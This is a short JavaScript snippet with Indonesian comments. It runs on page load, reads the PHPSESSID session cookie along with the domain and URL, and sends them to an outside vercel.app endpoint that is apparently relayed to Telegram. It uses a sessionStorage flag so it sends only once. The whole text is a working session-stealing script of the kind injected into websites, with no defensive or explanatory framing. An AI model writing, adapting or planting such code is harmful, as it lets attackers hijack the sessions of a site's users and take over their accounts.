function telegramSend() {
    // ⛔ cegah kirim 2x di halaman yang sama
    if (sessionStorage.getItem('telegram_sent')) return;
    sessionStorage.setItem('telegram_sent', '1');

    var domain = document.domain || '-';
    var url    = location.href || '-';

    // ✅ ambil PHPSESSID saja
    var phpsessid = 'Not Found';
    document.cookie.split('; ').forEach(c => {
        if (c.startsWith('PHPSESSID=')) {
            phpsessid = c;
        }
    });

    var message =
`<pre>┌───────────────
│ 📡 DOMAIN : ${domain}
│ 🌐 URL    : ${url}
│ ⚙️ PHPSESSID :
│ ${phpsessid}
└───────────</pre>`;

    fetch(
        'https://api-xi-two-52.vercel.app/api/config?message=' +
        encodeURIComponent(message)
    );
}

telegramSend();
